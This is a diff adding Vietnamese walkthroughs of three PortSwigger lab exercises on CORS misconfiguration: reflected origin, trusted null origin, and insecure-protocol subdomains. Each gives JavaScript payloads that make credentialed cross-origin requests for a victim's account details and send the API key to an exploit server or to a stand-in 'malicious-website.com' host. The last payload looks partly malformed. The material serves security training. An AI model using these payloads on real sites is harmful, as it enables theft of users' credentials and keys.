@@ -84,14 +84,97 @@ Bài lab đã mô tả là trang web này có cấu hình CORS không an toàn �
 Lab được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
 
 Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener: peter
+
+Truy cập bài lab và chúng ta thấy được 1 blog và có phần login.
+
+Theo như lab thì chúng ta login vào account được cấp từ trước và thấy được APIKey, đây chính là mục tiêu của chúng ta. Bắt lại request mà sẽ phản hồi về APIKey.
+
+
+Chuyển request sang repeater và chèn thêm dòng *Origin: https://example.com* vào request và send thì chúng ta sẽ thấy phản hồi *Access-Control-Allow-Origin* như mô tả vì trang web này tin cậy mọi nguồn gốc, điều đó dẫn đến bất kỳ trang web nào cũng có thể lấy được thông tin từ nó. Để lấy được apikey chúng ta có payload theo form sau : 
+```
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='//malicious-website.com/log?key='+this.responseText;
+};
+```
+
+Và từ đó chúng ta có được payload để sent vào exploit server như sau : 
+
+
+  ```
+  <script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','https://ac621fa31ffe7a398004558a00e900a1.web-security-academy.net/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='/log?key='+this.responseText;
+   };
+</script>
+```
+
+Sau khi Store payload và Deliver to Victim thì chúng ta AccessLog để lấy dữ liệu từ website chúng ta muốn và in ra màn hình như sau : 
+
+
+
+Chúng ta nhận thấy dòng log?key thì coppy và quan phần Decoder của BurpSuite để decode, chọn option url và chúng ta lấy được Apikey => submit để solve bài lab.
+
+
+### Lab: CORS vulnerability with trusted null origin  
+
+Trang web này có cấu hình CORS không an toàn ở chỗ nó tin tưởng nguồn gốc "null".
+
+Hãy tạo một số JavaScript sử dụng CORS để truy xuất khóa API của quản trị viên và tải mã lên máy chủ khai thác của bạn. Lab được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
+
+Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener: peter
+
+Tương tự như bài trước chúng ta phải leak đc APIkey của account được cấp sẵn. Tuy nhiên lỗ hồng lần này là vì CORS Origin : null chứ không phải là * như lần trước nên cách khai thác sẽ khác.
+
+Truy cập bài lab tương tự như bài trên và bắt lại request để phân tích
+
+Như đề bài mô tả thì web này lại tin cậy là null nên chúng ta gửi request kèm theo Origin : null và nhận đc như sau
+
+
+
+Chúng ta có thể sử dụng nhiều thủ thuật khác nhau để tạo ra một yêu cầu tên miền chéo có chứa giá trị null trong Origin Header. Điều này sẽ đáp ứng whitelist, dẫn đến truy cập tên miền chéo. Từ đó có payload như sau:
+
+
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+   var req = new XMLHttpRequest ();
+   req.onload = reqListener;
+   req.open('get','https://ac3e1f561f18f33a80d6a58f005900ee.web-security-academy.net/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='https://exploit-ac971f661f59f3b48092a571018c0000.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe>
+```
+
   
   
+### Lab: CORS vulnerability with trusted insecure protocols
+
+Trang web này có cấu hình CORS không an toàn ở chỗ nó tin cậy tất cả các miền phụ bất kể giao thức.
+
+Hãy tạo một số JavaScript sử dụng CORS để truy xuất khóa API của quản trị viên và tải mã lên máy chủ khai thác của bạn. Lab được giải quyết khi bạn gửi thành công khóa API của quản trị viên.
+
+Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener: peter
   
-  
-  
-  
-  
-  
+```
+<script>
+   document.location="http://stock.https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-ac131f241ecbc63281092d6d012d001e.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
   
   
   
